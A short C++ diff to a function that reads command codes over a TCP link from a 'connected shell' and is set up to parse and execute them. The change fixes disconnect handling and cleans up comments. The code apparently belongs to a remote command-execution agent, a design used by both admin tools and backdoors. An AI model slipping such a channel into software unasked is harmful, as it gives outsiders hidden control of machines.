@@ -14,18 +14,17 @@ void startTCP(string ip, int port) {
 // listen, parse, execute, evaluate, return, done.
 string receiveCommand() {
 
-	// listen
+	// Read bytes from the connected shell.
 	char basket[4096];
 	int bytesRead = tcpSocket->commsRead(basket, sizeof(basket));
 
-	if (bytesRead < 0) {
-		return"";
+	if (bytesRead <= 0) { // Stop on disconnect or read failure.
+		return "";
 	}
-	tcpSocket->commsListen(basket, sizeof(basket));
 
 	// parse
 	// Explicit cast to our enum type for extra safety
-	SYS_CALL call = static_cast<SYS_CALL>(basket[0]); // // Read the call code from the first byte.
+	SYS_CALL call = static_cast<SYS_CALL>(basket[0]); // Read the call code from the first byte.
 
 	// Several things need to happen now.
 	// 1.	The char buffer must be parsed further to extract all args.
